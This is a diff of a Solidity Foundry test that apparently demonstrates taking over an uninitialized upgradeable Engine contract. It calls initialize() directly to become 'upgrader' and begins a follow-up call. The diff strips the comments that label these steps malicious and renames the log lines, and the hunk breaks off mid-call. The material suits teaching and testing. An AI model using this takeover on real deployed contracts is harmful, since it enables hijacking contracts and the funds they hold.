@@ -15,12 +15,9 @@ contract ContractTest is Test {
         MotorbikeContract = new Motorbike(address(EngineContract));
         OperatorContract = new Operator();
 
-        // Engine contract is not initialized
-        console.log("Unintialized Upgrader:", EngineContract.upgrader());
-        // Malicious user calls initialize() on Engine contract to become upgrader.
+        console.log("Upgrader before:", EngineContract.upgrader());
         address(EngineContract).call(abi.encodeWithSignature("initialize()"));
-        // Malicious user becomes the upgrader
-        console.log("Initialized Upgrader:", EngineContract.upgrader());
+        console.log("Upgrader after:", EngineContract.upgrader());
 
         bytes memory initEncoded = abi.encodeWithSignature("operate()");
         address(EngineContract).call(
